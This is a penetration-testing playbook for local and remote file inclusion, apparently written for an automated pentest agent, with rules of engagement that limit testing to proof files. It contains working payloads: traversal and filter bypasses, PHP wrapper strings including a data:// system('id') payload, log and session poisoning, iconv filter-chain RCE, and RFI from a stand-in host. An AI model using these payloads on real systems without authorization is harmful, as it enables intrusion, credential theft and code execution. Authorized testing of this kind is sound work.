# Local/Remote File Inclusion (LFI/RFI)

## Scope and preconditions

Applies to any parameter that loads a file path, template, or module on the
server: `page=`, `file=`, `template=`, `include=`, `path=`, `lang=`, `view=`,
`module=`. Also applies to PHP wrappers, path traversal in file APIs, and any
endpoint where the server reads a file based on user input.

It does **not** cover: path traversal in file downloads without inclusion/execution
(use `path-traversal`), file upload leading to execution (use `file-upload`), or
XXE file read (use `xxe`).

## Rules of engagement

- MUST use only benign proof files. Read `/etc/passwd` or `C:\Windows\win.ini`
  to confirm — NEVER read private keys, database credentials, or application secrets
  beyond what is needed to prove the vulnerability.
- MUST NOT execute arbitrary commands on the server. Prove RCE with a sentinel
  (echoing a unique string), then stop.
- NEVER write files to the server unless explicitly authorized.
- MUST record the exact file path or wrapper used and the content returned.

## Workflow

- [ ] 1. Identify file inclusion parameters
- [ ] 2. Test basic path traversal
- [ ] 3. Bypass traversal filters
- [ ] 4. Test PHP wrappers
- [ ] 5. Test log/session poisoning
- [ ] 6. Test iconv filter-chain RCE
- [ ] 7. Test RFI (remote inclusion)
- [ ] 8. Record findings

## Step 1: Identify file inclusion parameters

### Goal
Find parameters that control server-side file loading.

### Actions
Use `get_endpoints` and `search_responses` to find:
- URL parameters: `?page=home`, `?file=report.pdf`, `?template=default`
- POST parameters with file-like values
- Cookie values containing file paths
- JSON/XML body fields with file references
- Fragments like `/loadModule?name=admin`
- Error messages revealing file paths (e.g., `Failed to include /var/www/...`)

## Step 2: Basic path traversal

### Goal
Break out of the intended directory to read arbitrary files.

### Actions
```
?page=../../../etc/passwd
?page=..\..\..\..\windows\win.ini
```

Start with 1 level (`../`) and increase to 10. The exact depth depends on the
application's working directory.

### Target files for proof

| OS | File | What it proves |
|---|---|---|
| Linux | `/etc/passwd` | File read (contains user list) |
| Linux | `/etc/hostname` | File read (hostname) |
| Windows | `C:\Windows\win.ini` | File read (always present) |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | File read |

### What to look for
- File contents in the response body
- Different error messages for existing vs. non-existing files
- Timing differences between valid and invalid paths

## Step 3: Bypass traversal filters

### Goal
Circumvent server-side path sanitization.

### Bypass techniques

| Filter | Bypass | Why it works |
|---|---|---|
| `../` stripped once | `....//` | After removing `../`, becomes `../` |
| `../` stripped recursively | `..%2f` | URL encoding not decoded before filter |
| URL encoding blocked | `%2e%2e%2f` | Double encoding, or mixed encoding |
| Double encoding blocked | `..%252f` | Triple encoding |
| Prefix check (/var/www/) | `../../../etc/passwd%00.php` | Null byte truncation (PHP < 5.3.4) |
| Extension appended (.php) | `../../../etc/passwd%00` | Null byte terminates string |
| Tomcat/Spring | `..;/..;/etc/passwd` | Semicolon treated as path parameter separator |
| Windows path length | `../../../etc/passwd` + 256 chars of `.` | Path truncation at MAX_PATH |
| Validation then double-decode | `%252e%252e%252f` | Validator sees `%2e`, app decodes to `..` |
| Input must end in `.php` | `php://filter/convert.base64-encode/resource=index` | Wrapper does not need extension |

Use `run_intruder_attack` to test all bypass variants systematically.

## Step 4: PHP wrappers

### Goal
Use PHP stream wrappers to read source code or achieve RCE.

### php://filter — Source code disclosure
```
?page=php://filter/convert.base64-encode/resource=index
```
Returns the PHP source code of `index.php` as base64. Decode it to read the
application source, find credentials, database connection strings, API keys.

Other useful filters:
```
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=../config/database
php://filter/string.rot13/resource=index
```

### data:// — Code execution
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
Base64 decodes to `<?php system('id'); ?>`. Requires `allow_url_include = On`.

### expect:// — Direct command execution
```
?page=expect://id
```
Rarely enabled, but worth testing. Requires the `expect` PHP extension.

### zip:// — Execution from uploaded zip
```
?page=zip:///tmp/uploads/shell.jpg%23payload.php
```
If you can upload a ZIP file (even renamed as .jpg), `zip://` extracts and
includes a file from within it. `#` (URL-encoded as `%23`) separates the
archive path from the internal filename.

### phar:// — Deserialization via file read
```
?page=phar:///tmp/uploads/malicious.phar
```
Reading a phar archive triggers deserialization of its metadata. If there is
a useful gadget chain, this is RCE via LFI. Works even if the phar is renamed
as .jpg or .png (polyglot file).

## Step 5: Log/session poisoning

### Goal
Inject PHP code into a file the server already writes, then include it.

### Access log poisoning
1. Send a request with a payload in the User-Agent header:
   ```
   User-Agent: <?php echo 'START'.php_uname().'END'; ?>
   ```
   Use `send_request` with the custom User-Agent.

2. Include the access log:
   ```
   ?page=../../../var/log/apache2/access.log
   ?page=../../../var/log/nginx/access.log
   ?page=../../../var/log/httpd/access_log
   ```

3. If the PHP code executes, you see `START...END` in the response.

### Error log poisoning
Trigger an error containing your payload, then include the error log:
```
?page=../../../var/log/apache2/error.log
```

### Session file poisoning
1. Find a parameter that is stored in the PHP session (e.g., username, language).
2. Set it to a PHP payload: `<?php echo 'VOID_TEST'; ?>`
3. Include your session file:
   ```
   ?page=../../../tmp/sess_YOUR_PHPSESSID
   ?page=../../../var/lib/php/sessions/sess_YOUR_PHPSESSID
   ```

### /proc/self/environ
On Linux, environment variables include the User-Agent:
```
?page=../../../proc/self/environ
```
If the User-Agent contains PHP code and the server includes this file, it
executes.

### /proc/self/fd/N
File descriptors may point to access log or error log:
```
?page=../../../proc/self/fd/2   (stderr → error log)
?page=../../../proc/self/fd/5   (varies by setup)
```
Try fd numbers 0-15 with `run_intruder_attack`.

## Step 6: iconv filter-chain RCE

### Goal
Achieve RCE from LFI alone — no file upload, no log poisoning, no writable files.

### Technique (Synacktiv 2022)
PHP's `php://filter` supports chaining multiple `convert.iconv.*` filters.
By carefully chaining charset conversions, you can generate arbitrary bytes
in the output. This means you can create a PHP payload from any existing file
(even `/etc/passwd`):

```
?page=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.iconv.UTF-8.CSISO2022KR|...|/resource=/etc/passwd
```

The chain is long (thousands of characters) but the technique is fully
automated by the `php_filter_chain_generator.py` tool. The output is a
`php://filter` URL that, when included, generates arbitrary PHP code.

### When to use
- LFI confirmed but no writable files
- `allow_url_include` is Off (rules out `data://`, `expect://`)
- No useful logs accessible
- No file upload functionality

### Limitations
- PHP only (iconv filters are PHP-specific)
- The URL is very long — may hit URL length limits. Use POST parameter instead.
- Requires `php://filter` to be available (almost always is)

## Step 7: Test RFI (remote file inclusion)

### Goal
Include a file from a remote server you control.

### Actions
```
?page=http://COLLAB_URL/shell.txt
?page=https://COLLAB_URL/shell.txt
?page=//COLLAB_URL/shell.txt
```

RFI requires `allow_url_include = On` in PHP (Off by default since PHP 5.2).
It is rare but devastating when found.

### What to look for
- OOB callback from the server (proves it tried to fetch your URL)
- Content from your remote file appearing in the response
- Different behavior between HTTP and HTTPS URLs

## Step 8: Record the finding

Use `add_pentest_finding` with:
- The vulnerable parameter and the payload used
- The file content or command output as evidence
- The specific bypass technique if filters were present
- The escalation path: file read → source code → credentials → RCE
- Impact assessment based on what was accessible

## Known false positives

- A path traversal that shows a different error for existing vs. non-existing
  files is a file oracle, not necessarily file inclusion. It reveals the file
  system structure but may not read file contents.
- An error message containing the path you submitted is path reflection, not
  LFI. The file was not included or read.
- PHP `include()` that processes the file as PHP — if you read `/etc/passwd`,
  it may execute as PHP and produce garbled output. Use `php://filter` with
  `convert.base64-encode` to get the raw content.
- `php://filter` returning empty output — the file may not exist, or the
  filter chain is wrong. Try without the encoding filter first.

## Reminder

LFI escalation follows a clear path: **file read → source code → credentials
→ RCE**. Start with `php://filter` for source code disclosure (it works even
without RCE). The highest-value escalation is the iconv filter-chain technique —
it achieves RCE from any LFI without needing file upload, log access, or
`allow_url_include`. Always test wrappers before giving up on RCE — the wrapper
is often the key that unlocks the full impact.
